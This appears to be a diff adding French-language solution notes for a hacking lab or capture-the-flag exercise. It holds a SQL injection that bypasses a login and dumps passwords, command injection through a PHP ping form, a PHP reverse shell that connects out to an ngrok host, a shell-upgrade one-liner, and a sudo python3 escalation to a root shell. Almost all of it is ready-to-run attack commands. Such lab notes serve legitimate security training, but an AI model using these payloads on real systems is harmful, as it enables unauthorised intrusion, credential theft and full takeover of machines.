@@ -25,3 +25,27 @@ SELECT * FROM data.users WHERE username = "a" AND password="" UNION SELECT 1,pas
 * Solution :
     Mettre en user : (n'importe quoi)
     Mettre en mdp : " UNION SELECT 1,password as username,2 FROM data.users WHERE username!="admin
+
+# RCE PHP - Ping
+
+* Solution:
+    ;ls
+    ;whoami
+
+reverse shell : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+nc -l -p 12345 
+ngrok tcp 12345
+php -r '$sock=fsockopen("2.tcp.ngrok.io",15705);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+upgrade : 
+python3 -c 'import pty;pty.spawn("/bin/bash")';
+
+# PrivEsc : Sudo
+sudo -l
+
+User www-data may run the following commands on machine1:
+    (root) NOPASSWD: /usr/bin/python3
+
+* Solution
+    sudo python3 -c "import os;os.system('whoami')"
+    sudo python3 -c "import os;os.system('bash')"
